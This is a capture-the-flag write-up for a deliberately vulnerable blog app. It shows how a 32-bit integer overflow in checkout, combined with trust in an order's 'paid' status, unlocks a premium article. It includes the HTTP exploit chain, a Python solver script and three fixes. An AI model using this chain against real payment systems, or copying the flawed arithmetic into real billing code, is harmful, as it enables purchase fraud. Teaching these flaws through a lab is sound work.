# LINA's BLOG — Writeup & Solution

## TL;DR

1. Register an account (starting wallet: $50.00 / 5000 cents).
2. Find the premium article `Lina's Private Security Research`
   (`article_id = 10` in the seeded DB), priced at **$999,999.99**
   (`price_cents = 99999999`).
3. Request a quote for that article with `quantity = 22`.
4. The server computes the line total using a simulated **32-bit signed
   fixed-width accumulator** instead of normal arithmetic:
   `99999999 * 22 = 2,199,999,978`, which exceeds `INT32_MAX`
   (2,147,483,647) and wraps around to **-2,094,967,318**.
5. Confirm the order: the confirm endpoint only checks
   `wallet_cents >= total_due_cents`. Any wallet balance is ≥ a large
   negative number, so the order is accepted and marked `paid`
   (the wallet balance actually *increases*, since a negative amount was
   "charged").
6. The entitlements module grants access purely because `orders.status ==
   'paid'`, with no re-verification that the charged amount bears any
   relationship to the article's real price.
7. `GET /premium/lina-private-research` now renders the full article body
   *and* the flag for this account.

## Why quantity = 22?

`price_cents = 99,999,999`

`INT32_MAX = 2,147,483,647`

`2,147,483,647 / 99,999,999 ≈ 21.47` → the first quantity that pushes the
product past `INT32_MAX` is **22**:

```
99,999,999 * 21 = 2,099,999,979   (still fits, no overflow)
99,999,999 * 22 = 2,199,999,978   (exceeds INT32_MAX)
2,199,999,978 - 2^32 = -2,094,967,318
```

Any quantity from 22 up to roughly 43 (where it would overflow *twice* and
potentially go positive again) works; the test suite and the reference
solve script below use 22 since it's the smallest and most reliable.

Technically quantities beyond ~43 start producing a second wrap that can
land back in positive territory — players exploring the boundary by hand
will quickly notice the sign flip and its periodicity, which is part of
the intended "aha" moment, not a flaw to patch around.

## Full annotated exploit chain

```http
POST /register
username=attacker&password=whatever123

POST /login
username=attacker&password=whatever123

POST /api/checkout/quote
Content-Type: application/json

{"article_id": 10, "quantity": 22}

-> {"quote_id": "...", "total_due_cents": -2094967318, ...}

POST /api/checkout/confirm
Content-Type: application/json

{"quote_id": "<quote_id from above>"}

-> {"status": "paid", "order_id": 1, "amount_charged_cents": -2094967318,
    "wallet_cents": 2094972318}

GET /premium/lina-private-research
-> 200 OK, page includes FLAG{...}
```

## Reference solver script

```python
import requests

BASE = "http://localhost:8000"
s = requests.Session()

s.post(f"{BASE}/register", data={"username": "solver", "password": "solver123"})
s.post(f"{BASE}/login", data={"username": "solver", "password": "solver123"})

# article_id 10 is "Lina's Private Security Research" in the seed data;
# a real player would discover this from the article feed / preview page
# rather than hardcoding it.
quote = s.post(f"{BASE}/api/checkout/quote",
                json={"article_id": 10, "quantity": 22}).json()
assert quote["total_due_cents"] < 0, quote

confirm = s.post(f"{BASE}/api/checkout/confirm",
                  json={"quote_id": quote["quote_id"]}).json()
assert confirm["status"] == "paid", confirm

page = s.get(f"{BASE}/premium/lina-private-research").text
flag = page.split("FLAG{")[1].split("}")[0]
print(f"FLAG{{{flag}}}")
```

This exact chain is also encoded as an automated pytest in
`tests/test_full_exploit_chain.py::test_integer_overflow_unlocks_private_research`,
which doubles as a CI-friendly solver/regression test — run it after any
change to `billing/`, `checkout/`, or `entitlements/` to make sure the
intended solve path still works and no accidental additional path opens up.

## The three interacting flaws (as designed)

1. **Untrusted purchase inputs** — `quantity` is client-controlled with
   only a cosmetic upper bound (`MAX_QUANTITY = 1_000_000`) that is far
   above what's needed to trigger the bug. The unit price itself is
   *not* spoofable (always read from the server-side `articles` table),
   which is important: the challenge is about the arithmetic, not a
   trivial price-tampering bug.
2. **Integer overflow** — `app/billing/legacy_arithmetic.py` emulates a
   32-bit signed fixed-width accumulator rather than letting Python's
   arbitrary-precision integers do the multiplication naturally. This is
   the one piece of code in the app that had to be written deliberately
   backwards, since plain Python would never overflow on its own.
3. **Broken entitlement validation** — `grant_entitlement()` in
   `app/entitlements/routes.py` trusts `orders.status == 'paid'`
   unconditionally. It never recomputes the article's true cost with
   correct arithmetic, never compares `amount_charged_cents` against
   `price_cents * quantity` computed correctly, and never questions a
   zero or negative charge.

Patching any **one** of the three independently breaks the exploit without
requiring the others to change, which is intentional — it's meant to
illustrate how business-logic chains fail at the seams between
components that each look correct in isolation:

- Bound `quantity` tightly (e.g. premium articles can only be purchased
  with `quantity == 1`) → the overflow can never be reached.
- Use normal (non-fixed-width) arithmetic for money → no overflow,
  regardless of quantity.
- Have entitlements recompute and verify
  `amount_charged_cents == price_cents * quantity` (correct arithmetic)
  before granting access → even an overflowed/garbage charge gets
  rejected downstream.